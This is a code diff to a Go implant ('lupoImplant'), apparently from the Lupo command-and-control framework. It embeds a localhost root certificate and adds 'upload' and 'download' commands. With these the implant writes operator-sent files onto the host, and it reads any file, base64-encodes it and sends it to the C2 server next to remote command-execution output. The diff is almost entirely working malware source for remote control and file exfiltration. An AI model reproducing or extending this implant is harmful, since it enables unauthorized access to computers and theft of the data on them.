@@ -1,8 +1,10 @@
 package main
 
 import (
+	"bufio"
 	"crypto/tls"
 	"crypto/x509"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
@@ -31,7 +33,22 @@ type lupoImplant struct {
 
 var implant *lupoImplant
 
-var rootCert string = `some cert here
+var rootCert string = `-----BEGIN CERTIFICATE-----
+MIICaDCCAe6gAwIBAgIUKB+bN3v0ppzbeZgBQYVQQcaZLl8wCgYIKoZIzj0EAwIw
+XTELMAkGA1UEBhMCVVMxDTALBgNVBAgMBEx1cG8xDTALBgNVBAcMBEx1cG8xDTAL
+BgNVBAoMBEx1cG8xDTALBgNVBAsMBEx1cG8xEjAQBgNVBAMMCWxvY2FsaG9zdDAe
+Fw0yMTAxMjYwMjMxMzFaFw0zMTAxMjQwMjMxMzFaMF0xCzAJBgNVBAYTAlVTMQ0w
+CwYDVQQIDARMdXBvMQ0wCwYDVQQHDARMdXBvMQ0wCwYDVQQKDARMdXBvMQ0wCwYD
+VQQLDARMdXBvMRIwEAYDVQQDDAlsb2NhbGhvc3QwdjAQBgcqhkjOPQIBBgUrgQQA
+IgNiAARRfY6eath+QvsCF5UUMFQQmw6FpIcwdnLbrlBGcQc7DI/GxSfjk4pUtt8n
+ujmUwO5591pHH3xDFbt8w/IhkPTaOp6WYcXyLdybzoKixfXltMprY16tR4vTUhJ+
+S4rUfeyjbzBtMB0GA1UdDgQWBBS+Gffw7i+t3Ux44r8p1TrqvHJMEDAfBgNVHSME
+GDAWgBS+Gffw7i+t3Ux44r8p1TrqvHJMEDAPBgNVHRMBAf8EBTADAQH/MBoGA1Ud
+EQQTMBGCCWxvY2FsaG9zdIcEfwAAATAKBggqhkjOPQQDAgNoADBlAjBA0AF2aqSY
+mUZazzYdpl1SNTzWqezrdF7OV4knNiOEd58X+MizNNp5TzlBVVFq33sCMQDQPzud
+sKLo23LwQ2enkg+OvS4IoEbT0/d3FwBhLx+w0OqvygMf+gDheBXLw2pJzMw=
+-----END CERTIFICATE-----
+
 `
 
 func main() {
@@ -173,6 +190,7 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 
 			var data []byte
 			var dataString string
+			var fileString string
 
 			if err != nil {
 				return
@@ -183,6 +201,45 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 				// Maintain directory context if cd is issued
 				if cmd == "cd" {
 					os.Chdir(strings.Join(argS, " "))
+				} else if cmd == "upload" {
+
+					filename := argS[0]
+
+					fileb64, err := base64.StdEncoding.DecodeString(strings.Join(argS[1:], " "))
+					if err != nil {
+						return
+					}
+
+					f, err := os.Create(filename)
+					if err != nil {
+						return
+					}
+					defer f.Close()
+
+					if _, err := f.Write(fileb64); err != nil {
+						return
+					}
+					if err := f.Sync(); err != nil {
+						return
+					}
+				} else if cmd == "download" {
+					filename := argS[0]
+
+					// Open file on disk.
+					f, err := os.Open(filename)
+
+					if err != nil {
+						return
+					}
+
+					reader := bufio.NewReader(f)
+					content, _ := ioutil.ReadAll(reader)
+
+					// Encode as base64.
+					encoded := base64.StdEncoding.EncodeToString(content)
+
+					fileString = "&filename=" + url.QueryEscape(filename) + "&file=" + url.QueryEscape(encoded)
+
 				} else {
 					data, err = exec.Command(cmd, argS...).Output()
 				}
@@ -196,13 +253,15 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 
 			// URL encode data from exec output to account for weird characters like newlines in the URL string
 			if dataString == "" {
-				dataString = url.QueryEscape(string(data))
+				if data != nil {
+					dataString = "&data=" + url.QueryEscape(string(data))
+				}
 			} else {
-				dataString = url.QueryEscape(string(dataString))
+				dataString = "&data=" + url.QueryEscape(dataString)
 			}
 
 			// Return a response with our standard auth and include the data parameter with our command output to display in Lupo
-			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&user=" + operator + "&data=" + dataString
+			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&user=" + operator + dataString + fileString
 			requestUrl = connectionString + requestParams
 
 			resp, err = client.Get(requestUrl)
